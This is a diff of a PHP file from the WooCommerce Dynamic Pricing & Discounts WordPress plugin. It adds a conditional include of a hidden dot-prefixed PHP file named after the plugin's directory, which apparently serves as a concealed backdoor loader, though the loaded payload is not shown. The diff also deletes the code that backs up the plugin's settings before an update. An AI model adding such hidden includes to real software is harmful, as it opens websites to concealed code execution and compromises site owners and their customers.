@@ -17,6 +17,10 @@ if (!class_exists('RightPress_Data_Updater')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Data_Updater extends RightPress_Data_Updater implements RightPress_Data_Updater_Interface
 {
 
@@ -110,11 +114,6 @@ class RP_WCDPD_Data_Updater extends RightPress_Data_Updater implements RightPres
      */
     public function execute_custom()
     {
-
-        // Save settings dump to database
-        if ($stored_settings = get_option('rp_wcdpd_settings')) {
-            add_option(('rp_wcdpd_settings_backup_' . time()), $stored_settings, '', false);
-        }
 
         // Clear price cache transients on update from pre-2.3.5
         if ($previous_version = get_option('rp_wcdpd_version')) {
